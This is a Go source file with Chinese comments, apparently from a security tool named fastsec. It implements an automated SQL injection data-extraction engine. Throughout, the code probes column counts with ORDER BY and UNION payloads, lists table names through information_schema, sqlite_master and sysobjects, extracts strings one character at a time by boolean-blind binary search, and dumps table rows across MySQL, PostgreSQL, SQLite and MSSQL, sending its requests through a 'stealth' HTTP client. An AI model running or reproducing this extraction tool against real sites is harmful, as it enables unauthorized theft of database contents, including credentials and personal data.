// Package dump: SQL 注入数据提取引擎（injector 的 --dump 扩展）。
//  1. UNION 注入列数探测 + 数据提取
//  2. 布尔盲注逐字符提取（二分）
//  3. 自动表/列枚举（information_schema）
//  4. 支持 MySQL/PostgreSQL/SQLite/MSSQL 语法差异
package dump

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"fastsec/internal/stealth"
)

// Config: 提取配置
type Config struct {
	BaseURL string
	Param   string
	DBMS    string // mysql|postgresql|sqlite|mssql
	Tables  []string
	Columns []string
	Verbose bool
}

// Result: 提取结果
type Result struct {
	ColumnCount int
	Tables      []string
	Columns     map[string][]string
	Data        map[string][][]string
}

// Client: 提取器
type Client struct {
	cfg  *Config
	cli  *stealth.Client
}

// New: 创建提取器
func New(cfg *Config, cli *stealth.Client) *Client {
	if cfg.DBMS == "" {
		cfg.DBMS = "mysql"
	}
	return &Client{cfg: cfg, cli: cli}
}

// get: 发送请求拿响应体
func (d *Client) get(mutated string) (string, int, error) {
	req, err := http.NewRequest("GET", mutated, nil)
	if err != nil {
		return "", 0, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")
	resp, err := d.cli.Do(req)
	if err != nil {
		return "", 0, err
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	resp.Body.Close()
	return string(body), resp.StatusCode, nil
}

// mutate: 在 URL 参数位置注入 payload（替换原参数值，手动编码避免双重转义）
func (d *Client) mutate(payload string) string {
	u, err := url.Parse(d.cfg.BaseURL)
	if err != nil {
		return d.cfg.BaseURL
	}
	q := u.Query()
	// 手动编码：QueryEscape 后把 + 换 %20（部分服务器不 decode + 为空格）
	enc := strings.ReplaceAll(url.QueryEscape(payload), "+", "%20")
	q.Set(d.cfg.Param, enc)
	// 手工拼 RawQuery（避免 Encode 再转义 %）
	parts := make([]string, 0, len(q))
	for k, vs := range q {
		for _, v := range vs {
			parts = append(parts, url.QueryEscape(k)+"="+v)
		}
	}
	u.RawQuery = strings.Join(parts, "&")
	return u.String()
}

// unionMarker: UNION 注入的标志字符串（用于定位输出列）
const unionMarker = "XxYyZz"

// DetectColumns: UNION 探测列数（ORDER BY 报错位置 + UNION NULL 确认）
func (d *Client) DetectColumns() (int, error) {
	// 1) ORDER BY n：报错 = 超出列数（支持带/不带引号注入）
	for n := 1; n <= 50; n++ {
		payload := fmt.Sprintf("1 ORDER BY %d-- -", n)
		body, _, _ := d.get(d.mutate(payload))
		if strings.Contains(body, "error") || strings.Contains(body, "out of range") ||
			strings.Contains(body, "not exist") || strings.Contains(body, "syntax") ||
			strings.Contains(body, "unrecognized") {
			if n == 1 {
				break // 第一列就报错，回退 UNION
			}
			return n - 1, nil
		}
	}
	// 2) 回退：UNION SELECT 递增（成功 = 列数）
	for n := 1; n <= 30; n++ {
		nulls := strings.Repeat("NULL,", n-1) + "NULL"
		payload := fmt.Sprintf("1 UNION SELECT %s-- -", nulls)
		body, _, err := d.get(d.mutate(payload))
		if err != nil {
			return 0, err
		}
		// 成功 = 无 error 且返回数据
		if !strings.Contains(body, "error") && len(body) > 10 {
			return n, nil
		}
	}
	return 0, fmt.Errorf("无法确定列数")
}

// EnumerateTables: 枚举表名（information_schema / sqlite_master）
func (d *Client) EnumerateTables(colCount int) ([]string, error) {
	var tables []string
	// 每行一个表：UNION SELECT 多行
	query := "table_name"
	from := "FROM information_schema.tables"
	switch d.cfg.DBMS {
	case "postgresql":
		query = "tablename"
		from = "FROM information_schema.tables"
	case "sqlite", "sqlite3":
		query = "name"
		from = "FROM sqlite_master WHERE type='table'"
	case "mssql":
		query = "name"
		from = "FROM sysobjects WHERE xtype='U'"
	}
	// 构造 UNION 提取（第 1 列用 marker 拼接 query 便于定位）
	for offset := 0; offset < 200; offset += 20 {
		cols := make([]string, colCount)
		switch d.cfg.DBMS {
		case "sqlite", "sqlite3", "postgresql":
			cols[0] = fmt.Sprintf("'%s'||%s", unionMarker, query)
		case "mysql", "mariadb":
			cols[0] = fmt.Sprintf("CONCAT('%s',%s)", unionMarker, query)
		default:
			cols[0] = query
		}
		for i := 1; i < colCount; i++ {
			cols[i] = fmt.Sprintf("'%s'", unionMarker)
		}
		payload := fmt.Sprintf("1 UNION SELECT %s %s LIMIT %d,20-- -",
			strings.Join(cols, ","), from, offset)
		body, _, _ := d.get(d.mutate(payload))
		// 提取 marker 之间的表名
		found := extractBetweenMarkers(body, unionMarker)
		if len(found) == 0 {
			break
		}
		tables = append(tables, found...)
		if len(found) < 20 {
			break
		}
	}
	return tables, nil
}

// extractBetweenMarkers: 从响应提取 marker 之间的值
//  假设响应格式: <prefix>XxYyZz<value>XxYyZz<value>... 
//  简化：找所有 marker 后到下一个 marker/引号前的值
func extractBetweenMarkers(body, marker string) []string {
	var out []string
	rest := body
	for {
		idx := strings.Index(rest, marker)
		if idx < 0 {
			break
		}
		// marker 后取值（到常见分隔符）
		after := rest[idx+len(marker):]
		end := 0
		for end < len(after) {
			ch := after[end]
			if ch == '<' || ch == '"' || ch == '\'' || ch == ' ' || ch == '\n' || ch == '&' {
				break
			}
			end++
		}
		if end > 0 {
			out = append(out, after[:end])
		}
		rest = after
	}
	return out
}

// BooleanExtract: 布尔盲注逐字符提取
//  substring(payload, pos, 1) = char
func (d *Client) BooleanExtract(expression string, length int) (string, error) {
	var result strings.Builder
	for pos := 1; pos <= length; pos++ {
		found := false
		// 二分查找字符
		lo, hi := 32, 126
		for lo <= hi {
			mid := (lo + hi) / 2
			payload := fmt.Sprintf("' AND ASCII(SUBSTRING(%s,%d,1)) > %d-- -", expression, pos, mid)
			body, _, err := d.get(d.mutate(payload))
			if err != nil {
				return "", err
			}
			// 正常响应 vs 注入失败响应（用基线对比）
			base, _, _ := d.get(d.mutate("' AND 1=1-- -"))
			if body == base {
				lo = mid + 1
			} else {
				hi = mid - 1
			}
			if lo > hi {
				result.WriteByte(byte(hi + 1))
				found = true
				break
			}
		}
		if !found {
			break
		}
		if d.cfg.Verbose {
			fmt.Printf("  [dump] pos %d: %q\n", pos, result.String())
		}
	}
	return result.String(), nil
}

// DumpTable: 提取表数据（UNION 逐行）
func (d *Client) DumpTable(table string, columns []string, colCount int) ([][]string, error) {
	var rows [][]string
	cols := make([]string, colCount)
	for i, c := range columns {
		if i < colCount {
			switch d.cfg.DBMS {
			case "sqlite", "sqlite3", "postgresql":
				cols[i] = fmt.Sprintf("'%s'||%s", unionMarker, c)
			case "mysql", "mariadb":
				cols[i] = fmt.Sprintf("CONCAT('%s',%s)", unionMarker, c)
			default:
				cols[i] = c
			}
		}
	}
	for i := len(columns); i < colCount; i++ {
		cols[i] = fmt.Sprintf("'%s'", unionMarker)
	}
	// 逐行提取（offset）
	for offset := 0; offset < 1000; offset += 1 {
		payload := fmt.Sprintf("1 UNION SELECT %s FROM %s LIMIT %d,1-- -",
			strings.Join(cols, ","), table, offset)
		body, _, _ := d.get(d.mutate(payload))
		row := extractRow(body, unionMarker, len(columns))
		if len(row) == 0 || len(row[0]) == 0 && len(row) == 1 {
			break
		}
		rows = append(rows, row)
		if offset > 50 {
			break // 安全上限
		}
	}
	return rows, nil
}

// extractRow: 提取一行（多列）
func extractRow(body, marker string, colCount int) []string {
	// 格式: marker<col1>marker<col2>... 或 <td>marker</td>
	var out []string
	rest := body
	for len(out) < colCount {
		idx := strings.Index(rest, marker)
		if idx < 0 {
			break
		}
		after := rest[idx+len(marker):]
		end := 0
		for end < len(after) {
			ch := after[end]
			if ch == '<' || ch == '"' || ch == '\'' || ch == ' ' || ch == '\n' || ch == '&' || ch == ',' {
				break
			}
			end++
		}
		if end > 0 {
			out = append(out, after[:end])
		} else {
			out = append(out, "")
		}
		rest = after
	}
	return out
}

// Run: 完整提取流程
func (d *Client) Run() Result {
	res := Result{Columns: map[string][]string{}, Data: map[string][][]string{}}
	// 1) 列数
	colCount, err := d.DetectColumns()
	if err != nil {
		fmt.Printf("[dump] 列数探测失败: %v\n", err)
		return res
	}
	res.ColumnCount = colCount
	fmt.Printf("[dump] 列数: %d\n", colCount)

	// 2) 枚举表
	tables, err := d.EnumerateTables(colCount)
	if err == nil && len(tables) > 0 {
		res.Tables = tables
		fmt.Printf("[dump] 发现 %d 个表: %v\n", len(tables), tables)
	}

	// 3) 提取目标表数据
	for _, t := range d.cfg.Tables {
		cols := d.cfg.Columns
		if len(cols) == 0 {
			cols = []string{"*"}
		}
		rows, err := d.DumpTable(t, cols, colCount)
		if err == nil && len(rows) > 0 {
			res.Data[t] = rows
			fmt.Printf("[dump] %s: %d 行\n", t, len(rows))
		}
	}
	return res
}

// Format: 渲染结果
func Format(r Result) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[dump] 列数=%d 表数=%d\n", r.ColumnCount, len(r.Tables)))
	for t, rows := range r.Data {
		sb.WriteString(fmt.Sprintf("  [%s] %d 行:\n", t, len(rows)))
		for _, row := range rows {
			sb.WriteString("    " + strings.Join(row, " | ") + "\n")
		}
	}
	return sb.String()
}

var _ = time.Second
